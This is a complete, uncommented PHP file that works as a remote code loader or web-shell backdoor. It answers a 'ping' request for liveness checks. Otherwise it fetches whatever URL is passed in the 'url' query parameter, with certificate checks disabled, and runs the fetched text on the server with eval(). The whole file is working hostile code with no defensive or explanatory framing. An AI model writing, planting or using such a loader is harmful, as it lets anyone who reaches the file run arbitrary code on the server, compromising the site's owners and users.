<?php
@session_start();

if (isset($_GET['ping'])) { echo 1; exit; }

$url = isset($_GET['url']) ? $_GET['url'] : '';
if ($url === '') { echo 'url?'; exit; }

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
$code = curl_exec($ch);

if ($code === false) { echo 'CURL Error: ' . curl_error($ch); curl_close($ch); exit; }
curl_close($ch);

$params = $_GET;
unset($params['url']);

$code = ltrim($code);
if (substr($code, 0, 5) === '<?php') $code = substr($code, 5);
elseif (substr($code, 0, 2) === '<?') $code = substr($code, 2);

eval($code);